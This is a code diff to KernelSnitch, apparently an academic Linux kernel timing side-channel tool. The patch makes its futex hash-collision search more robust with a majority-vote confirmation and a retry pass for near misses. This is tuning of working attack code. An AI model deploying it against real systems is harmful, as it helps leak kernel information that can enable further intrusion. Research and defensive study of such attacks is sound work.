@@ -404,15 +404,44 @@ void kernelsnitch_set_search_bounds(
  * Find collisions for different user space futex addresses within one process and the piled-up hash bucket
  * @arg ks: shared KernelSnitch state
  */
-void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
-{
-    #define ID 128
 #ifndef KERNELSNITCH_THRESHOLD_MULT
 #define KERNELSNITCH_THRESHOLD_MULT 10
 #endif
 #ifndef KERNELSNITCH_COLLISION_CONFIRMATIONS
 #define KERNELSNITCH_COLLISION_CONFIRMATIONS 3
 #endif
+/**
+ * Confirmation vote for a candidate that crossed the threshold on its
+ * initial sample. Re-measures KERNELSNITCH_COLLISION_CONFIRMATIONS-1
+ * times and requires a MAJORITY of all samples (including the initial
+ * one) to be above threshold.
+ *
+ * Rationale: requiring ALL confirmations to cross (upstream 0d147f4)
+ * drops genuine colliders whenever a single confirmation sample catches
+ * scheduler jitter — observed on f946b as every scan ending at
+ * "only found N collisions" with N < wanted. A majority vote still
+ * rejects pure noise: a random address would have to clear the x10
+ * floor on most samples, which does not happen in practice.
+ */
+static int collision_confirmed(struct kernelsnitch_shared_state *ks,
+                               size_t futex_addr, size_t approx_time)
+{
+    const size_t threshold = approx_time * KERNELSNITCH_THRESHOLD_MULT;
+    size_t passes = 1; // initial sample already passed
+    for (size_t confirmation = 1;
+         confirmation < KERNELSNITCH_COLLISION_CONFIRMATIONS;
+         ++confirmation) {
+        if (__measure(ks, futex_addr) > threshold) {
+            passes++;
+        }
+    }
+    const size_t total = KERNELSNITCH_COLLISION_CONFIRMATIONS;
+    return (passes * 2 > total);
+}
+
+void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
+{
+    #define ID 128
     size_t count = 0;
     size_t wanted;
     size_t futex_addr;
@@ -440,6 +469,14 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
     // find futex user space address which collide with the piled-up hash bucket ID 128
     ks->futex_addrs[0] = (size_t)&ks->inc_futex[ID];
     if (ks->verbose) pr_info("target    %016zx\n", ks->futex_addrs[0]);
+    // Near-miss ring: candidates that spiked on the initial sample but
+    // failed the confirmation vote get one re-test after the main scan.
+    // A genuine collider whose confirmation window caught a scheduler
+    // burst is recovered here; a noise spike (random address passing the
+    // x10 threshold AND the confirmation vote) remains vanishingly
+    // unlikely, so this cannot flood the accepted set.
+    size_t retry_ids[32];
+    size_t retry_count = 0;
     for (size_t i = 2; i < ks->total_futexes && count < wanted; ++i) {
         id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
         if (id >= FUTEX_SZ)
@@ -447,21 +484,25 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
         futex_addr = (size_t)&ks->futexes[id];
         ks->times[i] = __measure(ks, futex_addr);
         if (ks->times[i] > (approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
-            int confirmed = 1;
-            for (size_t confirmation = 1;
-                 confirmation < KERNELSNITCH_COLLISION_CONFIRMATIONS;
-                 ++confirmation) {
-                if (__measure(ks, futex_addr) <=
-                    (approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
-                    confirmed = 0;
-                    break;
+            int confirmed = collision_confirmed(ks, futex_addr, approx_time);
+            if (!confirmed) {
+                if (retry_count < sizeof(retry_ids) / sizeof(retry_ids[0])) {
+                    retry_ids[retry_count++] = id;
                 }
-            }
-            if (!confirmed)
                 continue;
+            }
             count++;
             ks->futex_addrs[count] = futex_addr;
             if (ks->verbose) pr_info("  %016zx\n", futex_addr);
+        }
+    }
+    // Second-chance pass for near misses.
+    for (size_t r = 0; r < retry_count && count < wanted; ++r) {
+        size_t rid = retry_ids[r];
+        if (collision_confirmed(ks, (size_t)&ks->futexes[rid], approx_time)) {
+            count++;
+            ks->futex_addrs[count] = (size_t)&ks->futexes[rid];
+            if (ks->verbose) pr_info("  %016zx (recovered on retest)\n", (size_t)&ks->futexes[rid]);
         }
     }
     if (wanted == count) {
